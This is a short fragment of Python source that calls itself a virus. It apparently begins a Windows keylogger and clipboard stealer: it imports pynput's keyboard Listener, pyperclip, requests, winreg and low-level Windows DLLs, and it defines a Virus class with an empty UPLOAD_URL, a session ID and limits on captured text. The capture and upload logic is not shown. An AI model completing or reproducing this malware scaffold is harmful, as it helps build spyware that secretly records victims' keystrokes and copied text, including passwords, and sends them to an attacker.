import ctypes.wintypes
import subprocess
import threading
import winreg
import ctypes
import sys
import os

from pynput.keyboard import Listener, KeyCode, Key
from datetime import datetime
from queue import Queue
import pyperclip
import requests
import socket
import string
import uuid
import time

kernel32 = ctypes.WinDLL("kernel32")
user32 = ctypes.WinDLL("user32")
ntdll = ctypes.WinDLL("ntdll")
psapi = ctypes.WinDLL("psapi")

# Your virus functionalities here
class Virus(object):
    UPLOAD_URL = ""
    MAX_LAST_PRESS = 5
    MAX_TEXTS = 1500
    SESSION_ID = uuid.uuid4()

    cool_texts = string.printable.strip()
